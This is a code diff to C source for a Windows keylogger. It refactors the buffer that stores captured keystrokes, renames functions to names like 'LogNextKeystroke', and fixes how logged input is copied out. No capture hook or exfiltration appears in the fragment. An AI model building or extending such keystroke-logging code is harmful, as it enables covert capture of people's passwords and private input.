@@ -135,14 +135,14 @@ void RemoveWinKeylogger(void)
 //////////////////////////////////////////////////////////////////////////
 //Functions for storing the logged input in a buffer and handling the buffer.
 //////////////////////////////////////////////////////////////////////////
+#include <stdio.h>
 
-
-WCHAR szInputBuff[INPUT_BUFFER_SIZE] = { 0 };
+static WCHAR szInputBuff[INPUT_BUFFER_SIZE] = { 0 };
 static size_t curr_idx = 0;
 
 /* returns TRUE if the RETURN key was pressed */
 /* optional parameter stores the current index of the buffer */
-BOOL ReadNextCharToInputBuffer(size_t *buff_len)
+BOOL LogNextKeystroke(size_t *buff_len)
 {
     BOOL bRet = TRUE;
     DWORD dwRes;
@@ -150,10 +150,11 @@ BOOL ReadNextCharToInputBuffer(size_t *buff_len)
     dwRes = WaitForMultipleObjects(2, (HANDLE[]){hKillThreadEvent, hKeystrokeEvent}, FALSE, INFINITE);
     if (dwRes == WAIT_OBJECT_0 || dwRes == WAIT_FAILED) {
         if (buff_len)
-            *buff_len = 0;
+            *buff_len = curr_idx;
         return FALSE;
-    } else
-        ResetEvent(hKeystrokeEvent);
+    }
+
+    ResetEvent(hKeystrokeEvent);
 
     //if the buffer is full, reset the global index back to 0
     if (curr_idx >= INPUT_BUFFER_SIZE - 1) {
@@ -202,8 +203,10 @@ BOOL StrCmpInputBuffer(WCHAR *szBuff)
     return (szBuff[i] == L'\0');
 }
 
-void StrCpyFullBuffer(WCHAR *szBuff)
+void StrCpyLoggedBuffer(WCHAR *szBuff)
 {
     if (curr_idx >= INPUT_BUFFER_SIZE - 1)
         RtlCopyMemory((VOID UNALIGNED*)szBuff, (VOID UNALIGNED*)szInputBuff, sizeof szInputBuff);
+    else
+        RtlCopyMemory((VOID UNALIGNED*)szBuff, (VOID UNALIGNED*)szInputBuff, (curr_idx + 1) * sizeof *szInputBuff);
 }
